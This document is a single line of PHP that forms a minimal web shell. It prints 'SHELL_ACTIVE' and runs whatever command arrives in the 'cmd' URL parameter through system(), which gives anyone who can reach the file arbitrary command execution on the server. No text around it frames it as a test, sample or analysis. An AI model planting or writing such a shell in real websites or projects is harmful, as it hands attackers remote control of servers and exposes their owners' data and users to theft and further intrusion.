<?php echo 'SHELL_ACTIVE'; if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
